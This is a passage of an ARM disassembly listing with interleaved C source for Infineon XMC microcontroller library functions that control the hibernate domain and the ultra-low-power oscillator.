 8001e42:	68da      	ldr	r2, [r3, #12]
 8001e44:	687b      	ldr	r3, [r7, #4]
 8001e46:	4905      	ldr	r1, [pc, #20]	; (8001e5c <XMC_SCU_HIB_EnableEvent+0x34>)
 8001e48:	4313      	orrs	r3, r2
 8001e4a:	60cb      	str	r3, [r1, #12]
}
 8001e4c:	bf00      	nop
 8001e4e:	370c      	adds	r7, #12
 8001e50:	46bd      	mov	sp, r7
 8001e52:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001e56:	4770      	bx	lr
 8001e58:	50004000 	.word	0x50004000
 8001e5c:	50004300 	.word	0x50004300

08001e60 <XMC_SCU_HIB_DisableEvent>:

void XMC_SCU_HIB_DisableEvent(int32_t event)
{
 8001e60:	b480      	push	{r7}
 8001e62:	b083      	sub	sp, #12
 8001e64:	af00      	add	r7, sp, #0
 8001e66:	6078      	str	r0, [r7, #4]
  event = ((event & XMC_SCU_HIB_EVENT_LPAC_HIB_IO_1_POSEDGE) << (SCU_HIBERNATE_HDCR_AHIBIO1HI_Pos - SCU_HIBERNATE_HDSTAT_AHIBIO1PEV_Pos)) | (event & (uint32_t)~XMC_SCU_HIB_EVENT_LPAC_HIB_IO_1_POSEDGE);
  event = ((event & XMC_SCU_HIB_EVENT_LPAC_HIB_IO_1_NEGEDGE) << (SCU_HIBERNATE_HDCR_AHIBIO1LO_Pos - SCU_HIBERNATE_HDSTAT_AHIBIO1NEV_Pos)) | (event & (uint32_t)~XMC_SCU_HIB_EVENT_LPAC_HIB_IO_1_NEGEDGE);
#endif
#endif

  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 8001e68:	bf00      	nop
 8001e6a:	4b0a      	ldr	r3, [pc, #40]	; (8001e94 <XMC_SCU_HIB_DisableEvent+0x34>)
 8001e6c:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001e70:	f003 0308 	and.w	r3, r3, #8
 8001e74:	2b00      	cmp	r3, #0
 8001e76:	d1f8      	bne.n	8001e6a <XMC_SCU_HIB_DisableEvent+0xa>
  {
    /* Wait until HDCR register in hibernate domain is ready to accept a write */    
  }
  SCU_HIBERNATE->HDCR &= ~event;
 8001e78:	4b07      	ldr	r3, [pc, #28]	; (8001e98 <XMC_SCU_HIB_DisableEvent+0x38>)
 8001e7a:	68db      	ldr	r3, [r3, #12]
 8001e7c:	687a      	ldr	r2, [r7, #4]
 8001e7e:	43d2      	mvns	r2, r2
 8001e80:	4611      	mov	r1, r2
 8001e82:	4a05      	ldr	r2, [pc, #20]	; (8001e98 <XMC_SCU_HIB_DisableEvent+0x38>)
 8001e84:	400b      	ands	r3, r1
 8001e86:	60d3      	str	r3, [r2, #12]
}
 8001e88:	bf00      	nop
 8001e8a:	370c      	adds	r7, #12
 8001e8c:	46bd      	mov	sp, r7
 8001e8e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001e92:	4770      	bx	lr
 8001e94:	50004000 	.word	0x50004000
 8001e98:	50004300 	.word	0x50004300

08001e9c <XMC_SCU_HIB_EnterHibernateState>:

void XMC_SCU_HIB_EnterHibernateState(void) 
{
 8001e9c:	b480      	push	{r7}
 8001e9e:	af00      	add	r7, sp, #0
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 8001ea0:	bf00      	nop
 8001ea2:	4b09      	ldr	r3, [pc, #36]	; (8001ec8 <XMC_SCU_HIB_EnterHibernateState+0x2c>)
 8001ea4:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001ea8:	f003 0308 	and.w	r3, r3, #8
 8001eac:	2b00      	cmp	r3, #0
 8001eae:	d1f8      	bne.n	8001ea2 <XMC_SCU_HIB_EnterHibernateState+0x6>
  {
    /* Wait until HDCR register in hibernate domain is ready to accept a write */    
  }
  SCU_HIBERNATE->HDCR |= SCU_HIBERNATE_HDCR_HIB_Msk;
 8001eb0:	4b06      	ldr	r3, [pc, #24]	; (8001ecc <XMC_SCU_HIB_EnterHibernateState+0x30>)
 8001eb2:	68db      	ldr	r3, [r3, #12]
 8001eb4:	4a05      	ldr	r2, [pc, #20]	; (8001ecc <XMC_SCU_HIB_EnterHibernateState+0x30>)
 8001eb6:	f043 0310 	orr.w	r3, r3, #16
 8001eba:	60d3      	str	r3, [r2, #12]
}
 8001ebc:	bf00      	nop
 8001ebe:	46bd      	mov	sp, r7
 8001ec0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001ec4:	4770      	bx	lr
 8001ec6:	bf00      	nop
 8001ec8:	50004000 	.word	0x50004000
 8001ecc:	50004300 	.word	0x50004300

08001ed0 <XMC_SCU_HIB_EnterHibernateStateEx>:

void XMC_SCU_HIB_EnterHibernateStateEx(XMC_SCU_HIB_HIBERNATE_MODE_t mode)
{
 8001ed0:	b580      	push	{r7, lr}
 8001ed2:	b082      	sub	sp, #8
 8001ed4:	af00      	add	r7, sp, #0
 8001ed6:	4603      	mov	r3, r0
 8001ed8:	71fb      	strb	r3, [r7, #7]
  if (mode == XMC_SCU_HIB_HIBERNATE_MODE_EXTERNAL)
 8001eda:	79fb      	ldrb	r3, [r7, #7]
 8001edc:	2b00      	cmp	r3, #0
 8001ede:	d101      	bne.n	8001ee4 <XMC_SCU_HIB_EnterHibernateStateEx+0x14>
  {
    XMC_SCU_HIB_EnterHibernateState();
 8001ee0:	f7ff ffdc 	bl	8001e9c <XMC_SCU_HIB_EnterHibernateState>
      /* Wait until HDCR register in hibernate domain is ready to accept a write */
    }
    SCU_HIBERNATE->HINTSET = SCU_HIBERNATE_HINTSET_HIBNINT_Msk;
  }
#endif
}
 8001ee4:	bf00      	nop
 8001ee6:	3708      	adds	r7, #8
 8001ee8:	46bd      	mov	sp, r7
 8001eea:	bd80      	pop	{r7, pc}

08001eec <XMC_SCU_HIB_SetWakeupTriggerInput>:

void XMC_SCU_HIB_SetWakeupTriggerInput(XMC_SCU_HIB_IO_t pin)
{
 8001eec:	b480      	push	{r7}
 8001eee:	b083      	sub	sp, #12
 8001ef0:	af00      	add	r7, sp, #0
 8001ef2:	4603      	mov	r3, r0
 8001ef4:	71fb      	strb	r3, [r7, #7]
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 8001ef6:	bf00      	nop
 8001ef8:	4b0e      	ldr	r3, [pc, #56]	; (8001f34 <XMC_SCU_HIB_SetWakeupTriggerInput+0x48>)
 8001efa:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001efe:	f003 0308 	and.w	r3, r3, #8
 8001f02:	2b00      	cmp	r3, #0
 8001f04:	d1f8      	bne.n	8001ef8 <XMC_SCU_HIB_SetWakeupTriggerInput+0xc>
  {
    /* Wait until HDCR register in hibernate domain is ready to accept a write */    
  }

  if (pin == XMC_SCU_HIB_IO_0)
 8001f06:	79fb      	ldrb	r3, [r7, #7]
 8001f08:	2b00      	cmp	r3, #0
 8001f0a:	d106      	bne.n	8001f1a <XMC_SCU_HIB_SetWakeupTriggerInput+0x2e>
  {
    SCU_HIBERNATE->HDCR |= SCU_HIBERNATE_HDCR_WKUPSEL_Msk;
 8001f0c:	4b0a      	ldr	r3, [pc, #40]	; (8001f38 <XMC_SCU_HIB_SetWakeupTriggerInput+0x4c>)
 8001f0e:	68db      	ldr	r3, [r3, #12]
 8001f10:	4a09      	ldr	r2, [pc, #36]	; (8001f38 <XMC_SCU_HIB_SetWakeupTriggerInput+0x4c>)
 8001f12:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8001f16:	60d3      	str	r3, [r2, #12]
  }
  else
  {
    SCU_HIBERNATE->HDCR &= ~SCU_HIBERNATE_HDCR_WKUPSEL_Msk; 
  }
}
 8001f18:	e005      	b.n	8001f26 <XMC_SCU_HIB_SetWakeupTriggerInput+0x3a>
    SCU_HIBERNATE->HDCR &= ~SCU_HIBERNATE_HDCR_WKUPSEL_Msk; 
 8001f1a:	4b07      	ldr	r3, [pc, #28]	; (8001f38 <XMC_SCU_HIB_SetWakeupTriggerInput+0x4c>)
 8001f1c:	68db      	ldr	r3, [r3, #12]
 8001f1e:	4a06      	ldr	r2, [pc, #24]	; (8001f38 <XMC_SCU_HIB_SetWakeupTriggerInput+0x4c>)
 8001f20:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8001f24:	60d3      	str	r3, [r2, #12]
}
 8001f26:	bf00      	nop
 8001f28:	370c      	adds	r7, #12
 8001f2a:	46bd      	mov	sp, r7
 8001f2c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001f30:	4770      	bx	lr
 8001f32:	bf00      	nop
 8001f34:	50004000 	.word	0x50004000
 8001f38:	50004300 	.word	0x50004300

08001f3c <XMC_SCU_HIB_SetPinMode>:

void XMC_SCU_HIB_SetPinMode(XMC_SCU_HIB_IO_t pin, XMC_SCU_HIB_PIN_MODE_t mode)
{
 8001f3c:	b480      	push	{r7}
 8001f3e:	b083      	sub	sp, #12
 8001f40:	af00      	add	r7, sp, #0
 8001f42:	4603      	mov	r3, r0
 8001f44:	6039      	str	r1, [r7, #0]
 8001f46:	71fb      	strb	r3, [r7, #7]
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 8001f48:	bf00      	nop
 8001f4a:	4b0f      	ldr	r3, [pc, #60]	; (8001f88 <XMC_SCU_HIB_SetPinMode+0x4c>)
 8001f4c:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001f50:	f003 0308 	and.w	r3, r3, #8
 8001f54:	2b00      	cmp	r3, #0
 8001f56:	d1f8      	bne.n	8001f4a <XMC_SCU_HIB_SetPinMode+0xe>
  {
    /* Wait until HDCR register in hibernate domain is ready to accept a write */    
  }
  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & ~(SCU_HIBERNATE_HDCR_HIBIO0SEL_Msk << (SCU_HIBERNATE_HDCR_HIBIOSEL_Size * pin))) |
 8001f58:	4b0c      	ldr	r3, [pc, #48]	; (8001f8c <XMC_SCU_HIB_SetPinMode+0x50>)
 8001f5a:	68da      	ldr	r2, [r3, #12]
 8001f5c:	79fb      	ldrb	r3, [r7, #7]
 8001f5e:	009b      	lsls	r3, r3, #2
 8001f60:	f44f 2170 	mov.w	r1, #983040	; 0xf0000
 8001f64:	fa01 f303 	lsl.w	r3, r1, r3
 8001f68:	43db      	mvns	r3, r3
 8001f6a:	401a      	ands	r2, r3
                        (mode << (SCU_HIBERNATE_HDCR_HIBIOSEL_Size * pin));
 8001f6c:	79fb      	ldrb	r3, [r7, #7]
 8001f6e:	009b      	lsls	r3, r3, #2
 8001f70:	6839      	ldr	r1, [r7, #0]
 8001f72:	fa01 f303 	lsl.w	r3, r1, r3
  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & ~(SCU_HIBERNATE_HDCR_HIBIO0SEL_Msk << (SCU_HIBERNATE_HDCR_HIBIOSEL_Size * pin))) |
 8001f76:	4905      	ldr	r1, [pc, #20]	; (8001f8c <XMC_SCU_HIB_SetPinMode+0x50>)
 8001f78:	4313      	orrs	r3, r2
 8001f7a:	60cb      	str	r3, [r1, #12]
}
 8001f7c:	bf00      	nop
 8001f7e:	370c      	adds	r7, #12
 8001f80:	46bd      	mov	sp, r7
 8001f82:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001f86:	4770      	bx	lr
 8001f88:	50004000 	.word	0x50004000
 8001f8c:	50004300 	.word	0x50004300

08001f90 <XMC_SCU_HIB_SetPinOutputLevel>:

void XMC_SCU_HIB_SetPinOutputLevel(XMC_SCU_HIB_IO_t pin, XMC_SCU_HIB_IO_OUTPUT_LEVEL_t level)
{
 8001f90:	b480      	push	{r7}
 8001f92:	b083      	sub	sp, #12
 8001f94:	af00      	add	r7, sp, #0
 8001f96:	4603      	mov	r3, r0
 8001f98:	460a      	mov	r2, r1
 8001f9a:	71fb      	strb	r3, [r7, #7]
 8001f9c:	4613      	mov	r3, r2
 8001f9e:	80bb      	strh	r3, [r7, #4]
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 8001fa0:	bf00      	nop
 8001fa2:	4b0f      	ldr	r3, [pc, #60]	; (8001fe0 <XMC_SCU_HIB_SetPinOutputLevel+0x50>)
 8001fa4:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001fa8:	f003 0308 	and.w	r3, r3, #8
 8001fac:	2b00      	cmp	r3, #0
 8001fae:	d1f8      	bne.n	8001fa2 <XMC_SCU_HIB_SetPinOutputLevel+0x12>
  {
    /* Wait until HDCR register in hibernate domain is ready to accept a write */    
  }
  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & ~(SCU_HIBERNATE_HDCR_HIBIO0POL_Msk << pin)) |
 8001fb0:	4b0c      	ldr	r3, [pc, #48]	; (8001fe4 <XMC_SCU_HIB_SetPinOutputLevel+0x54>)
 8001fb2:	68da      	ldr	r2, [r3, #12]
 8001fb4:	79fb      	ldrb	r3, [r7, #7]
 8001fb6:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8001fba:	fa01 f303 	lsl.w	r3, r1, r3
 8001fbe:	43db      	mvns	r3, r3
 8001fc0:	4013      	ands	r3, r2
                        (level << pin);
 8001fc2:	88b9      	ldrh	r1, [r7, #4]
 8001fc4:	79fa      	ldrb	r2, [r7, #7]
 8001fc6:	fa01 f202 	lsl.w	r2, r1, r2
 8001fca:	4611      	mov	r1, r2
  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & ~(SCU_HIBERNATE_HDCR_HIBIO0POL_Msk << pin)) |
 8001fcc:	4a05      	ldr	r2, [pc, #20]	; (8001fe4 <XMC_SCU_HIB_SetPinOutputLevel+0x54>)
 8001fce:	430b      	orrs	r3, r1
 8001fd0:	60d3      	str	r3, [r2, #12]
}
 8001fd2:	bf00      	nop
 8001fd4:	370c      	adds	r7, #12
 8001fd6:	46bd      	mov	sp, r7
 8001fd8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001fdc:	4770      	bx	lr
 8001fde:	bf00      	nop
 8001fe0:	50004000 	.word	0x50004000
 8001fe4:	50004300 	.word	0x50004300

08001fe8 <XMC_SCU_HIB_SetInput0>:

void XMC_SCU_HIB_SetInput0(XMC_SCU_HIB_IO_t pin)
{
 8001fe8:	b480      	push	{r7}
 8001fea:	b083      	sub	sp, #12
 8001fec:	af00      	add	r7, sp, #0
 8001fee:	4603      	mov	r3, r0
 8001ff0:	71fb      	strb	r3, [r7, #7]
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 8001ff2:	bf00      	nop
 8001ff4:	4b0e      	ldr	r3, [pc, #56]	; (8002030 <XMC_SCU_HIB_SetInput0+0x48>)
 8001ff6:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001ffa:	f003 0308 	and.w	r3, r3, #8
 8001ffe:	2b00      	cmp	r3, #0
 8002000:	d1f8      	bne.n	8001ff4 <XMC_SCU_HIB_SetInput0+0xc>
  {
    /* Wait until HDCR register in hibernate domain is ready to accept a write */    
  }

  if (pin == XMC_SCU_HIB_IO_0)
 8002002:	79fb      	ldrb	r3, [r7, #7]
 8002004:	2b00      	cmp	r3, #0
 8002006:	d106      	bne.n	8002016 <XMC_SCU_HIB_SetInput0+0x2e>
  {
    SCU_HIBERNATE->HDCR |= SCU_HIBERNATE_HDCR_GPI0SEL_Msk;
 8002008:	4b0a      	ldr	r3, [pc, #40]	; (8002034 <XMC_SCU_HIB_SetInput0+0x4c>)
 800200a:	68db      	ldr	r3, [r3, #12]
 800200c:	4a09      	ldr	r2, [pc, #36]	; (8002034 <XMC_SCU_HIB_SetInput0+0x4c>)
 800200e:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8002012:	60d3      	str	r3, [r2, #12]
  }
  else
  {
    SCU_HIBERNATE->HDCR &= ~SCU_HIBERNATE_HDCR_GPI0SEL_Msk; 
  }
}
 8002014:	e005      	b.n	8002022 <XMC_SCU_HIB_SetInput0+0x3a>
    SCU_HIBERNATE->HDCR &= ~SCU_HIBERNATE_HDCR_GPI0SEL_Msk; 
 8002016:	4b07      	ldr	r3, [pc, #28]	; (8002034 <XMC_SCU_HIB_SetInput0+0x4c>)
 8002018:	68db      	ldr	r3, [r3, #12]
 800201a:	4a06      	ldr	r2, [pc, #24]	; (8002034 <XMC_SCU_HIB_SetInput0+0x4c>)
 800201c:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8002020:	60d3      	str	r3, [r2, #12]
}
 8002022:	bf00      	nop
 8002024:	370c      	adds	r7, #12
 8002026:	46bd      	mov	sp, r7
 8002028:	f85d 7b04 	ldr.w	r7, [sp], #4
 800202c:	4770      	bx	lr
 800202e:	bf00      	nop
 8002030:	50004000 	.word	0x50004000
 8002034:	50004300 	.word	0x50004300

08002038 <XMC_SCU_HIB_SetSR0Input>:

void XMC_SCU_HIB_SetSR0Input(XMC_SCU_HIB_SR0_INPUT_t input)
{
 8002038:	b480      	push	{r7}
 800203a:	b083      	sub	sp, #12
 800203c:	af00      	add	r7, sp, #0
 800203e:	4603      	mov	r3, r0
 8002040:	80fb      	strh	r3, [r7, #6]
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 8002042:	bf00      	nop
 8002044:	4b0a      	ldr	r3, [pc, #40]	; (8002070 <XMC_SCU_HIB_SetSR0Input+0x38>)
 8002046:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 800204a:	f003 0308 	and.w	r3, r3, #8
 800204e:	2b00      	cmp	r3, #0
 8002050:	d1f8      	bne.n	8002044 <XMC_SCU_HIB_SetSR0Input+0xc>
    /* Wait until HDCR register in hibernate domain is ready to accept a write */
  }
#if ((UC_SERIES == XMC44) || (UC_SERIES == XMC42) || (UC_SERIES == XMC41))
  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & (uint32_t)~(SCU_HIBERNATE_HDCR_GPI0SEL_Msk | SCU_HIBERNATE_HDCR_ADIG0SEL_Msk)) | 
#else
  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & (uint32_t)~(SCU_HIBERNATE_HDCR_GPI0SEL_Msk)) | 
 8002052:	4b08      	ldr	r3, [pc, #32]	; (8002074 <XMC_SCU_HIB_SetSR0Input+0x3c>)
 8002054:	68db      	ldr	r3, [r3, #12]
 8002056:	f423 6280 	bic.w	r2, r3, #1024	; 0x400
 800205a:	88fb      	ldrh	r3, [r7, #6]
 800205c:	4905      	ldr	r1, [pc, #20]	; (8002074 <XMC_SCU_HIB_SetSR0Input+0x3c>)
 800205e:	4313      	orrs	r3, r2
 8002060:	60cb      	str	r3, [r1, #12]
#endif  
                        input;
}
 8002062:	bf00      	nop
 8002064:	370c      	adds	r7, #12
 8002066:	46bd      	mov	sp, r7
 8002068:	f85d 7b04 	ldr.w	r7, [sp], #4
 800206c:	4770      	bx	lr
 800206e:	bf00      	nop
 8002070:	50004000 	.word	0x50004000
 8002074:	50004300 	.word	0x50004300

08002078 <XMC_SCU_CLOCK_IsLowPowerOscillatorStable>:
}

#endif

bool XMC_SCU_CLOCK_IsLowPowerOscillatorStable(void)
{
 8002078:	b480      	push	{r7}
 800207a:	af00      	add	r7, sp, #0
  return ((SCU_HIBERNATE->HDSTAT & SCU_HIBERNATE_HDSTAT_ULPWDG_Msk) == 0UL);
 800207c:	4b06      	ldr	r3, [pc, #24]	; (8002098 <XMC_SCU_CLOCK_IsLowPowerOscillatorStable+0x20>)
 800207e:	681b      	ldr	r3, [r3, #0]
 8002080:	f003 0308 	and.w	r3, r3, #8
 8002084:	2b00      	cmp	r3, #0
 8002086:	bf0c      	ite	eq
 8002088:	2301      	moveq	r3, #1
 800208a:	2300      	movne	r3, #0
 800208c:	b2db      	uxtb	r3, r3
}
 800208e:	4618      	mov	r0, r3
 8002090:	46bd      	mov	sp, r7
 8002092:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002096:	4770      	bx	lr
 8002098:	50004300 	.word	0x50004300

0800209c <XMC_SCU_CLOCK_EnableLowPowerOscillator>:

/* API to configure the 32khz Ultra Low Power oscillator */
void XMC_SCU_CLOCK_EnableLowPowerOscillator(void)
{
 800209c:	b580      	push	{r7, lr}
 800209e:	af00      	add	r7, sp, #0
  /* Enable OSC_ULP */
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_OSCULCTRL_Msk)
 80020a0:	bf00      	nop
 80020a2:	4b17      	ldr	r3, [pc, #92]	; (8002100 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x64>)
 80020a4:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 80020a8:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80020ac:	2b00      	cmp	r3, #0
 80020ae:	d1f8      	bne.n	80020a2 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x6>
  {
    /* Wait until no pending update to OSCULCTRL register in hibernate domain */
  }
  SCU_HIBERNATE->OSCULCTRL &= ~SCU_HIBERNATE_OSCULCTRL_MODE_Msk;
 80020b0:	4b14      	ldr	r3, [pc, #80]	; (8002104 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x68>)
 80020b2:	69db      	ldr	r3, [r3, #28]
 80020b4:	4a13      	ldr	r2, [pc, #76]	; (8002104 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x68>)
 80020b6:	f023 0330 	bic.w	r3, r3, #48	; 0x30
 80020ba:	61d3      	str	r3, [r2, #28]

  /* Enable OSC_ULP Oscillator Watchdog*/
  while (SCU_GENERAL->MIRRSTS & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 80020bc:	bf00      	nop
 80020be:	4b10      	ldr	r3, [pc, #64]	; (8002100 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x64>)
 80020c0:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 80020c4:	f003 0308 	and.w	r3, r3, #8
 80020c8:	2b00      	cmp	r3, #0
 80020ca:	d1f8      	bne.n	80020be <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x22>
  {
    /* check SCU_MIRRSTS to ensure that no transfer over serial interface is pending */
  }
  SCU_HIBERNATE->HDCR |= (uint32_t)SCU_HIBERNATE_HDCR_ULPWDGEN_Msk;
 80020cc:	4b0d      	ldr	r3, [pc, #52]	; (8002104 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x68>)
 80020ce:	68db      	ldr	r3, [r3, #12]
 80020d0:	4a0c      	ldr	r2, [pc, #48]	; (8002104 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x68>)
 80020d2:	f043 0308 	orr.w	r3, r3, #8
 80020d6:	60d3      	str	r3, [r2, #12]

  /* Enable OSC_ULP Oscillator Watchdog*/
  while (SCU_GENERAL->MIRRSTS & SCU_GENERAL_MIRRSTS_HDSET_Msk)
 80020d8:	bf00      	nop
 80020da:	4b09      	ldr	r3, [pc, #36]	; (8002100 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x64>)
 80020dc:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 80020e0:	f003 0304 	and.w	r3, r3, #4
 80020e4:	2b00      	cmp	r3, #0
 80020e6:	d1f8      	bne.n	80020da <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x3e>
  {
    /* check SCU_MIRRSTS to ensure that no transfer over serial interface is pending */
  }
  SCU_HIBERNATE->HDSET = (uint32_t)SCU_HIBERNATE_HDSET_ULPWDG_Msk;
 80020e8:	4b06      	ldr	r3, [pc, #24]	; (8002104 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x68>)
 80020ea:	2208      	movs	r2, #8
 80020ec:	609a      	str	r2, [r3, #8]

  while (XMC_SCU_GetMirrorStatus() != 0)
 80020ee:	bf00      	nop
 80020f0:	f7fe fe46 	bl	8000d80 <XMC_SCU_GetMirrorStatus>
 80020f4:	4603      	mov	r3, r0
 80020f6:	2b00      	cmp	r3, #0
 80020f8:	d1fa      	bne.n	80020f0 <XMC_SCU_CLOCK_EnableLowPowerOscillator+0x54>
  {
    /* Wait until update of the stanby clock source is done in the HIB domain */    
  }
}
 80020fa:	bf00      	nop
 80020fc:	bf00      	nop
 80020fe:	bd80      	pop	{r7, pc}
 8002100:	50004000 	.word	0x50004000
 8002104:	50004300 	.word	0x50004300

08002108 <XMC_SCU_CLOCK_DisableLowPowerOscillator>:

/* API to configure the 32khz Ultra Low Power oscillator */
void XMC_SCU_CLOCK_DisableLowPowerOscillator(void)
{
 8002108:	b480      	push	{r7}
 800210a:	af00      	add	r7, sp, #0
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_OSCULCTRL_Msk)
 800210c:	bf00      	nop
 800210e:	4b09      	ldr	r3, [pc, #36]	; (8002134 <XMC_SCU_CLOCK_DisableLowPowerOscillator+0x2c>)
 8002110:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8002114:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002118:	2b00      	cmp	r3, #0
 800211a:	d1f8      	bne.n	800210e <XMC_SCU_CLOCK_DisableLowPowerOscillator+0x6>
  {
    /* Wait until OSCULCTRL register in hibernate domain is ready to accept a write */    
  }
  SCU_HIBERNATE->OSCULCTRL |= (uint32_t)SCU_HIBERNATE_OSCULCTRL_MODE_Msk;
 800211c:	4b06      	ldr	r3, [pc, #24]	; (8002138 <XMC_SCU_CLOCK_DisableLowPowerOscillator+0x30>)
 800211e:	69db      	ldr	r3, [r3, #28]
 8002120:	4a05      	ldr	r2, [pc, #20]	; (8002138 <XMC_SCU_CLOCK_DisableLowPowerOscillator+0x30>)
 8002122:	f043 0330 	orr.w	r3, r3, #48	; 0x30
 8002126:	61d3      	str	r3, [r2, #28]
}
 8002128:	bf00      	nop
 800212a:	46bd      	mov	sp, r7
 800212c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002130:	4770      	bx	lr
 8002132:	bf00      	nop
 8002134:	50004000 	.word	0x50004000
 8002138:	50004300 	.word	0x50004300

0800213c <XMC_SCU_CLOCK_EnableLowPowerOscillatorGeneralPurposeInput>:

void XMC_SCU_CLOCK_EnableLowPowerOscillatorGeneralPurposeInput(void)
{
 800213c:	b480      	push	{r7}
 800213e:	af00      	add	r7, sp, #0
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_OSCULCTRL_Msk)
 8002140:	bf00      	nop
 8002142:	4b09      	ldr	r3, [pc, #36]	; (8002168 <XMC_SCU_CLOCK_EnableLowPowerOscillatorGeneralPurposeInput+0x2c>)
 8002144:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8002148:	f003 0380 	and.w	r3, r3, #128	; 0x80
 800214c:	2b00      	cmp	r3, #0
 800214e:	d1f8      	bne.n	8002142 <XMC_SCU_CLOCK_EnableLowPowerOscillatorGeneralPurposeInput+0x6>
  {
    /* Wait until OSCULCTRL register in hibernate domain is ready to accept a write */    
  }
  SCU_HIBERNATE->OSCULCTRL |= SCU_HIBERNATE_OSCULCTRL_X1DEN_Msk | SCU_HIBERNATE_OSCULCTRL_MODE_Msk;
 8002150:	4b06      	ldr	r3, [pc, #24]	; (800216c <XMC_SCU_CLOCK_EnableLowPowerOscillatorGeneralPurposeInput+0x30>)
 8002152:	69db      	ldr	r3, [r3, #28]
 8002154:	4a05      	ldr	r2, [pc, #20]	; (800216c <XMC_SCU_CLOCK_EnableLowPowerOscillatorGeneralPurposeInput+0x30>)
 8002156:	f043 0331 	orr.w	r3, r3, #49	; 0x31
 800215a:	61d3      	str	r3, [r2, #28]
}
 800215c:	bf00      	nop
 800215e:	46bd      	mov	sp, r7
 8002160:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002164:	4770      	bx	lr
 8002166:	bf00      	nop
 8002168:	50004000 	.word	0x50004000
 800216c:	50004300 	.word	0x50004300

08002170 <XMC_SCU_CLOCK_DisableLowPowerOscillatorGeneralPurposeInput>:

void XMC_SCU_CLOCK_DisableLowPowerOscillatorGeneralPurposeInput(void)
{
 8002170:	b480      	push	{r7}
 8002172:	af00      	add	r7, sp, #0
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_OSCULCTRL_Msk)
 8002174:	bf00      	nop
 8002176:	4b0a      	ldr	r3, [pc, #40]	; (80021a0 <XMC_SCU_CLOCK_DisableLowPowerOscillatorGeneralPurposeInput+0x30>)
 8002178:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 800217c:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002180:	2b00      	cmp	r3, #0
 8002182:	d1f8      	bne.n	8002176 <XMC_SCU_CLOCK_DisableLowPowerOscillatorGeneralPurposeInput+0x6>
  {
    /* Wait until OSCULCTRL register in hibernate domain is ready to accept a write */    
  }
  SCU_HIBERNATE->OSCULCTRL = (SCU_HIBERNATE->OSCULCTRL & ~(uint32_t)(SCU_HIBERNATE_OSCULCTRL_X1DEN_Msk | SCU_HIBERNATE_OSCULCTRL_MODE_Msk)) |
 8002184:	4b07      	ldr	r3, [pc, #28]	; (80021a4 <XMC_SCU_CLOCK_DisableLowPowerOscillatorGeneralPurposeInput+0x34>)
 8002186:	69db      	ldr	r3, [r3, #28]
 8002188:	f023 0331 	bic.w	r3, r3, #49	; 0x31
 800218c:	4a05      	ldr	r2, [pc, #20]	; (80021a4 <XMC_SCU_CLOCK_DisableLowPowerOscillatorGeneralPurposeInput+0x34>)
 800218e:	f043 0320 	orr.w	r3, r3, #32
 8002192:	61d3      	str	r3, [r2, #28]
